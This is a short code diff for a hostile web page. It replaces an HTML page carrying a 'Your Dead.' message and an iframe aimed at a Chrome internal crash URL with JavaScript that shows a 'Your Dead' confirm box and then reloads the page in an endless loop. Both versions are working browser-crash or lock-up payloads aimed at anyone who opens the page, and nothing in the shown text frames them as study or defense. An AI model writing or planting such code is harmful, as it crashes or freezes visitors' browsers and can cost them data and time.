@@ -1,6 +1,7 @@
-<head>
-</head>
-<body>
-  <p>Your Dead.</p>
-  <iframe src="chrome://inducebrowsercrashforrealz" title="chrome://inducebrowsercrashforrealz"></iframe>
-</body>
+onbeforeunload = function(){localStorage.x=1};
+
+if(confirm("Your Dead")){
+  setTimeout(function(){
+    while(1)location.reload(1)
+  }, 1000)
+}
